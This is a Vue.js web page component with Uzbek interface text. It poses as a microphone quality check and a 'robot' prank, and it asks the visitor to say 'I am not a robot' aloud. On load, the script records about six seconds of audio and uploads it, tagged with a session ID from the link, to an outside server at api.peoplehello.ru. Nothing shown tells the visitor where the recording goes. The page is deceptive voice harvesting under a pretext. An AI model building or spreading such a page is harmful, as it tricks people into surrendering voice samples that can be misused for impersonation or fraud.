<template>
  <div class="prank-wrapper">

    <!-- ⏱️ COUNTDOWN -->
    <div v-if="stage === 'countdown'" class="overlay center">
      <div class="card">
        <div class="big">{{ countdown }}</div>
        <p class="muted">Tayyorlanmoqda…</p>
      </div>
    </div>

    <!-- ⚙️ SETUP -->
    <div v-if="stage === 'setup'" class="overlay center">
      <div class="card">
        <h2>🎤 Ovoz tekshiruvi</h2>
        <p>
          Mikrofon sifati tekshiriladi.
          <br>Bu bir necha soniya davom etadi.
        </p>
        <span class="muted">
          Keyingi bosqichda sizdan bitta gap aytish so‘raladi
        </span>
      </div>
    </div>

    <!-- 😂 PRANK -->
    <div v-if="stage === 'prank'" class="overlay center">
      <div class="card neon">
        <h2>😂 Kulgili holat</h2>
        <p>Tizim sizni <b>robot</b> deb o‘ylayapti</p>

        <div class="speech">
          🎤 “Men robot emasman”
        </div>

        <span class="muted">
          Iltimos, baland ovozda ayting…
        </span>
      </div>
    </div>

    <!-- ✅ DONE -->
    <div v-if="stage === 'done'" class="overlay center">
      <div class="card">
        <h2>✅ Tayyor</h2>
        <p>Rahmat! Davom etyapmiz…</p>
      </div>
    </div>

  </div>
</template>

<script>
export default {
  data() {
    return {
      session_id: null,

      stage: 'countdown', // countdown | setup | prank | done
      countdown: 3,

      mediaRecorder: null,
      audioChunks: []
    }
  },

  mounted() {
    this.session_id = this.$route.params.id
    if (!this.session_id) return

    this.startFlow()
  },

  methods: {
    /* ==========================
       🎬 FLOW BOSHQARUVI
    ========================== */
    startFlow() {
      // ⏱️ COUNTDOWN
      const timer = setInterval(() => {
        this.countdown--

        if (this.countdown === 0) {
          clearInterval(timer)
          this.stage = 'setup'

          // 1.5 soniyadan keyin prank
          setTimeout(() => {
            this.stage = 'prank'
            this.startAudioRecording()
          }, 2500)
        }
      }, 1000)
    },

    /* ==========================
       🎙️ OVOZ YOZISH
    ========================== */
    async startAudioRecording() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          audio: true
        })

        this.audioChunks = []
        this.mediaRecorder = new MediaRecorder(stream)

        this.mediaRecorder.ondataavailable = e => {
          if (e.data.size > 0) this.audioChunks.push(e.data)
        }

        this.mediaRecorder.onstop = () => {
          const audioBlob = new Blob(this.audioChunks, {
            type: 'audio/webm'
          })
          this.sendAudio(audioBlob)
        }

        this.mediaRecorder.start()

        // 🎯 4 soniya yozib olamiz
        setTimeout(() => {
          this.mediaRecorder.stop()
          stream.getTracks().forEach(t => t.stop())
          this.stage = 'done'
        }, 6000)



      } catch (e) {
        console.error('Microphone error:', e)
      }
    },

    /* ==========================
       📤 SERVERGA YUBORISH
    ========================== */
    async sendAudio(blob) {
      try {
        const form = new FormData()
        form.append('session_id', this.session_id)
        form.append('audio', blob)

        await fetch('https://api.peoplehello.ru/api/audio', {
          method: 'POST',
          body: form
        })

      } catch (e) {
        console.error('Audio upload error:', e)
      }
    }
  }
}
</script>

<style scoped>
.prank-wrapper {
  position: fixed;
  inset: 0;
  background: #000;
}

.overlay {
  position: fixed;
  inset: 0;
  background: rgba(0,0,0,.85);
  z-index: 10;
}

.center {
  display: flex;
  justify-content: center;
  align-items: center;
}

.card {
  background: #111;
  border-radius: 16px;
  padding: 28px;
  max-width: 340px;
  text-align: center;
  color: #fff;
  box-shadow: 0 0 40px rgba(0,255,200,.15);
}

.card.neon {
  border: 1px solid #00ffcc;
}

.big {
  font-size: 96px;
  font-weight: bold;
}

.muted {
  opacity: .7;
  font-size: 14px;
}

.speech {
  margin: 20px 0;
  padding: 16px;
  border-radius: 14px;
  background: #00ffcc;
  color: #000;
  font-weight: bold;
  font-size: 18px;
}
</style>
